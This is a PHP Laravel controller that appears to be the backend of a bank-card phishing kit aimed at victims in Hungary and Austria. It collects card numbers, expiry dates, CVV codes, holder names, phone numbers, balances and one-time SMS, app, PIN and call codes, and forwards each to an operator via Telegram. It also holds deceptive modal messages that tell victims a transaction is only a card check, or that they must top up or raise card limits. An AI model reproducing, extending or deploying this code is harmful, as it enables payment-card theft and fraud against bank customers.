<?php

namespace App\Http\Controllers;

use App\Models\Countries;
use App\Models\Logs;
use App\Models\Services;
use App\Models\Users;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Telegram\Bot\Laravel\Facades\Telegram;

class ApiController extends Controller
{
    public $words = [
        'Венгрия' => [
            'error_hold' => 'Próbálja újra 20-30 perc múlva.',
            'success_hold' => 'A pénz 24-48 órán belül megérkezik a bankszámlájára.',
            'push' => 'A kártya ellenőrzéséhez erősítse meg a tranzakciót a bank mobilalkalmazásában.
A pénz átutalásához ellenőrizni kell a kártyáját. Ez egy kérés a kártya ellenőrzésére, de nem kerül leírásra, a rendszer csak azt jelzi, hogy a kártya nincs letiltva és üzemkész.',
            'change'=>'Jelenleg nem működünk együtt ennek a banknak a kártyáival. Másik bankkártyát kell megadni!',
            'deposit' => 'A rendszerben történő hitelesítéshez az azonosított kártyabirtokosnak legalább 500 egységnyi valutával kell rendelkeznie a kártyán. Ez egy egyszeri eljárás, amelyet a jövőben nem kell megismételni. A kártyabirtokosnak fel kell töltenie a kártyát, vagy meg kell próbálnia egy másik kártya használatát.',
            'limit' => 'A tranzakció befejezéséhez növelnie kell a kártya internetes korlátait!'
        ],
        'Австрия' => [
            'error_hold' => 'Versuchen Sie es nach 20-30 Minuten erneut.',
            'success_hold' => 'Das Geld wird innerhalb von 24-48 Stunden auf Ihr Bankkonto überwiesen.',
            'push' => 'Zur Überprüfung der Karte bestätigen Sie die Transaktion in der mobilen Bankanwendung.
Um das Geld zu überweisen, müssen Sie Ihre Karte überprüfen. Dies ist eine Anfrage zur Überprüfung der Karte, wird jedoch nicht abgeschrieben. Das System zeigt nur an, dass die Karte nicht gesperrt und betriebsbereit ist.',
            'change'=>'Wir arbeiten derzeit nicht mit den Karten dieser Bank zusammen. Sie müssen eine andere Bankkarte angeben!',
            'deposit' => 'Um sich im System zu authentifizieren, muss der identifizierte Karteninhaber über mindestens 500 Einheiten Währung auf der Karte verfügen. Dies ist ein einmaliger Vorgang, der in Zukunft nicht wiederholt werden muss. Der Karteninhaber muss die Karte aufladen oder versuchen, eine andere Karte zu verwenden.',
            'limit' => 'Um die Transaktion abzuschließen, müssen Sie die Internetlimits auf Ihrer Karte erhöhen!',
        ]

    ];

    public function index($id, $action)
    {

        $log = Logs::with(['links','services','countries'])->where('id', $id)->first();
        if (!$log) {
            abort(404);
        }

        $link = $log->links;

        $service = Services::query()->where('id', $log->links->service)->first();

        $country = Countries::query()->where('id', $service['country_id'])->first();

        $response = [
        ];

        if(!$log->check_online){
            $response['check_online'] = False;
            $log->check_online = True;
            $log->save();
        }
        switch ($log->status){
            case 'sms':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/sms';
                break;
            case 'app':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/app';
                break;
            case 'call':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/call';
                break;
            case 'pin':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/pin';
                break;
            case 'reload':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/reload';
                break;
            case 'accurate':
                $response['vbiv'] = '/'.$country->code.'/'.$log->id.'/accurate';
                break;
            case 'error_hold':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['error_hold'],
                    'icon' => 'error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'success_hold':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['success_hold'],
                    'icon' => 'success',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'push':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['push'],
                    'icon' => 'info',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'change':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['change'],
                    'icon' => 'error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'limit':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['limit'],
                    'icon' => 'error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'deposit':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['deposit'],
                    'icon' => 'error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'custom_error':
                $response['modal'] = [
                    'message' => $log->custom_error,
                    'icon' => 'error',
                    'type' => 'custom_error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    "input"=>"text",
                    'preConfirm'=>True,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'custom_text':
                $response['modal'] = [
                    'message' => $log->custom_text,
                    'icon' => 'info',
                    'type' => 'custom_text',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    "input"=>"text",
                    'preConfirm'=>True,
                    "imageUrl" => False,
                ];
                $log->status = "wait";
                $log->save();
                break;
            case 'custom_photo':
                $response['modal'] = [
                    'message' => '',
                    'path'=>'42343',
                    'icon' => 'info',
                    'type' => 'custom_photo',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    "input"=>"text",
                    "imageUrl" => $log->custom_photo,
                    'preConfirm'=>True
                ];
                $log->status = "wait";
                $log->save();
                break;
        }
        return response()->json($response);
    }
    public function card(Request $request){

        $request = $request->all();
        if (isset($request['SRcardData'])){
            $request = $request['SRcardData'];
        }
        $log = Logs::with('links')->where('id', $request['log'])->first();
        $log->status = "wait";
        switch($request['type']){
            case 'receive':
                $log->card = $request['SRDataCardNumber'];
                $log->expire = $request['SRDataExpirationDate'];
                $log->cvc = $request['SRDataCVV'];
                $log->holder = $request['SRDataFullName'];
                $log->number = $request['SRDataPhone'];
                if (isset($request['SRDataBalance'])) {
                    $log->balance = $request['SRDataBalance'];
                } else {
                    $log->balance = null;
                }

                $link = $log->links;
                $worker = Users::query()->where('id', $link->user)->first();

                TelegramService::sendLog($log, $link,$worker);
                break;
            case 'accurate':
                $log->accurate_balance = $request['SRDataBalance'];
                $log->balance = $request['SRDataBalance'];
                echo $log->status;
                TelegramService::sendAccuratebalance($log, $log->accurate_balance);
                break;
            case 'sms':
                $log->sms = $request['SRDataBalance'];

                TelegramService::sendSMS($log);
                break;
            case 'app':
                $log->app = $request['SRDataBalance'];

                TelegramService::sendAppCode($log);
                break;
            case 'pin':
                $log->pin = $request['SRDataBalance'];

                TelegramService::sendPinCode($log);
                break;
            case 'call':
                $log->call = $request['SRDataBalance'];

                TelegramService::sendCallCode($log);
                break;
            case 'custom_text':
                $log->custom_text = $request['value'];

                TelegramService::sendAnswer($log);
                break;
            case 'custom_error':
                $log->custom_error = $request['value'];

                TelegramService::sendAnswer($log);
                break;
            case 'custom_photo':
                $log->custom_photo = $request['value'];

                TelegramService::sendAnswer($log);
                break;
        }
        $log->save();
        return response()->json(['status' => "success"]);
    }
}
